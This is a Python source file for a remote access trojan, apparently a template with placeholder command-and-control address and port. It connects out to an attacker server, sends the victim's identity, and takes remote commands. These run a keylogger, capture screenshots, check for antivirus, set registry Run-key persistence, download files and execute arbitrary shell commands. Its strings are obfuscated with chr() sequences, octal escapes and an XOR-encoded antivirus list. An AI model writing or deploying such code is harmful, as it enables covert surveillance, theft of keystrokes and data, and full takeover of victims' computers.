#coding:utf-8
import requests
import socket
import os
import subprocess
from PIL import ImageGrab
import pynput.keyboard
import time
import logging
from bs4 import BeautifulSoup
import tempfile
import random
import string
import sys
import psutil

#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1
#COMMTEMPLATE1

def fct_download(url):
	get_response = requests.get(url)
	nom_fichier = url.split("/")[-1]

	try:
		with open(nom_fichier, mode="wb") as fichier_output:
			fichier_output.write(get_response.content)
	except PermissionError:
		os.remove(nom_fichier)
		with open(nom_fichier, mode="wb") as fichier_output:
			fichier_output.write(get_response.content)

def detect_av():
    AV_List = ['2e0a2f15370d065d101b1c', '221d23121311042010110f0b06174d040b10', '021f15361711175d101b1c', '020f05101311055d101b1c',
               '222f253604004f160d06', '011d0302170d155d101b1c', '210c0e093516000111201610005c061916', '0612100b5c061916',
               '050a0a0a01170401465157071d17', '243d3106130d4f160d06', '020f124b171b04', '284e2117043017105b060107',
               '2e1a2335371b045d101b1c', '2d1610111d0d321616160b0b110b4d040b10', '331814231c3017015b060107', '301814361711171a160657071d17',
               '261716000013131a06062a0717040a02165b060107', '342b31245c061916', '393832171b1500100c301c10131b00045d101b1c']
    
    key = chr(99) + chr(121) + chr(98) + chr(101) + chr(114) + chr(99) + chr(97) + chr(115) + chr(117)
    key_bytes = key.encode()
    encrypted_AV_List = []

    AV_dec = []

    for antivirus in AV_List:
        encrypted_bytes = bytes.fromhex(antivirus)
        decrypted_bytes = []

        for i in range(len(encrypted_bytes)):
            key_byte = key_bytes[i % len(key_bytes)]
            decrypted_byte = encrypted_bytes[i] ^ key_byte
            decrypted_bytes.append(decrypted_byte)
        dev_av = bytes(decrypted_bytes).decode()
        AV_dec.append(dev_av)

    Proc_List = ""

    for p in psutil.process_iter():
        Proc_List += p.name() + "\n"

    for antivirus in AV_dec:
        if antivirus in Proc_List:
            return(chr(65) + chr(110) + chr(116) + chr(105) + chr(118) + chr(105) + chr(114) + chr(117) + chr(115) + chr(32) + chr(100) + chr(233) + chr(116) + chr(101) + chr(99) + chr(116) + chr(233) + chr(32) + chr(58) + chr(32) + antivirus)
        else:
            return(chr(65) + chr(117) + chr(99) + chr(117) + chr(110) + chr(32) + chr(97) + chr(110) + chr(116) + chr(105) + chr(118) + chr(105) + chr(114) + chr(117) + chr(115) + chr(32) + chr(100) + chr(233) + chr(116) + chr(101) + chr(99) + chr(116) + chr(233) + chr(46))

#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2
#COMMTEMPLATE2

def fct_screenshot(picname):
	myscreenshot = ImageGrab.grab()
	myscreenshot.save(picname)

def process_key_press(key):
	logging.debug(key)

def fct_persistence():
	localisation = os.environ[chr(116) + chr(101) + chr(109) + chr(112)] + sys.argv[0]
	if not os.path.exists(localisation):
		shutil.copyfile(sys.executable, localisation)
		subprocess.call("\162\145\147\40\141\144\144\40\110\113\105\131\137\103\125\122\122\105\116\124\137\125\123\105\122\134\123\117\106\124\127\101\122\105\134\115\151\143\162\157\163\157\146\164\134\127\151\156\144\157\167\163\134\103\165\162\162\145\156\164\126\145\162\163\151\157\156\134\122\165\156\40\57\166\40\117\156\145\137\104\162\151\166\145\40\57\146\40\57\164\40\122\105\107\137\123\132\40\57\144\40" + '"' + localisation + '"', shell=True)

#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3
#COMMTEMPLATE3

buffer = 1024 * 128

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4
#COMMTEMPLATE4

myhost = "METTRE_IP_DU_C2_ICI"
myport = METTRE_PORT_DU_C2_ICI

tmpdir = tempfile.gettempdir()

#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5
#COMMTEMPLATE5

try:
	mysock.connect((myhost, myport))

except ConnectionRefusedError:
	time.sleep(300)
	mysock.connect((myhost, myport))

#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6
#COMMTEMPLATE6

username = subprocess.check_output(chr(119) + chr(104) + chr(111) + chr(97) + chr(109) + chr(105), shell=True).decode()
hostname = subprocess.check_output(chr(104) + chr(111) + chr(115) + chr(116) + chr(110) + chr(97) + chr(109) + chr(101), shell=True).decode()
req_for_IP = requests.get(chr(104) + chr(116) + chr(116) + chr(112) + chr(115) + chr(58) + chr(47) + chr(47) + chr(105) + chr(112) + chr(118) + chr(52) + chr(46) + chr(119) + chr(116) + chr(102) + chr(105) + chr(115) + chr(109) + chr(121) + chr(105) + chr(112) + chr(46) + chr(99) + chr(111) + chr(109) + chr(47) + chr(116) + chr(101) + chr(120) + chr(116))
IP_addr = req_for_IP.text
version_pc = subprocess.check_output(chr(119) + chr(109) + chr(105) + chr(99) + chr(32) + chr(111) + chr(115) + chr(32) + chr(103) + chr(101) + chr(116) + chr(32) + chr(118) + chr(101) + chr(114) + chr(115) + chr(105) + chr(111) + chr(110), shell=True).decode().strip().split("\n")[-1]
identification_string = username + ";" + hostname + ";" + IP_addr + ";" + version_pc
mysock.send(identification_string.encode("utf-8"))


while True:
	
	command = mysock.recv(buffer).decode("utf-8")
	
	if command == chr(103) + chr(111) + chr(111) + chr(100) + chr(98) + chr(121) + chr(101):
		mysock.close()
		exit(0)

#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7
#COMMTEMPLATE7

	elif command == chr(112) + chr(101) + chr(114) + chr(115) + chr(105) + chr(115) + chr(116) + chr(101) + chr(110) + chr(99) + chr(101):
		fct_persistence()

	elif command == chr(115) + chr(116) + chr(97) + chr(114) + chr(116) + chr(95) + chr(107) + chr(101) + chr(121) + chr(108) + chr(111) + chr(103) + chr(103) + chr(101) + chr(114):
		tmp_logs = ''.join(random.choices(string.ascii_lowercase, k=8)) + chr(46) + chr(105) + chr(110) + chr(105)
		logger = logging.basicConfig(filename=tmpdir + "\\" + tmp_logs, level=logging.DEBUG, format='%(asctime)s: %(message)s')
		keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
		keyboard_listener.start()

#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8
#COMMTEMPLATE8

	elif command == chr(115) + chr(116) + chr(111) + chr(112) + chr(95) + chr(107) + chr(101) + chr(121) + chr(108) + chr(111) + chr(103) + chr(103) + chr(101) + chr(114):
		keyboard_listener.stop()
		len_logs = str(os.path.getsize(tmpdir + "\\" + tmp_logs))
		mysock.send(len_logs.encode("utf-8"))
		with open(tmpdir + "\\" + tmp_logs, "rb") as logs:
			mysock.send(logs.read())
		with open(tmpdir + "\\" + tmp_logs, "w"):
			pass
		pass

	elif command == chr(115) + chr(99) + chr(114) + chr(101) + chr(101) + chr(110) + chr(115) + chr(104) + chr(111) + chr(116):
		tmp_pic = ''.join(random.choices(string.ascii_lowercase, k=8)) + chr(46) + chr(112) + chr(110) + chr(103)
		fct_screenshot(tmpdir + "\\" + tmp_pic)
		len_img = str(os.path.getsize(tmpdir + "\\" + tmp_pic)) 
		mysock.send(len_img.encode("utf-8"))
		
		with open(tmpdir + "\\" + tmp_pic, "rb") as img:
			mysock.send(img.read())
		os.remove(tmpdir + "\\" + tmp_pic)

	elif command == chr(115) + chr(104) + chr(111) + chr(119) + chr(95) + chr(97) + chr(118):
        mysock.send(detect_av().encode("utf-8"))

#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9
#COMMTEMPLATE9

	elif command == chr(99) + chr(100):
		result = subprocess.Popen(chr(99) + chr(100), shell=True, stdout=subprocess.PIPE)
		mysock.send(result.stdout.read())

	elif command[:2] == chr(99) + chr(100):
		
		if os.path.exists(str(command[3:].replace("\n", ""))):
			os.chdir(str(command[3:].replace("\n", ""))) 
			mysock.send(os.popen(chr(99) + chr(100)).read().encode("utf-8"))

#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10
#COMMTEMPLATE10

	elif command == chr(100) + chr(111) + chr(119) + chr(110) + chr(108) + chr(111) + chr(97) + chr(100) + chr(95) + chr(102) + chr(105) + chr(108) + chr(101) + chr(95) + chr(119) + chr(101) + chr(98):
		lien = mysock.recv(buffer).decode("utf-8")
		fct_download(str(lien))

	else:
		pass

#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11
#COMMTEMPLATE11

		r = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		result = r.communicate() 
		if result[1]: 
			mysock.send(result[1])
		else: 
			mysock.send(result[0])

#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
#COMMTEMPLATE12
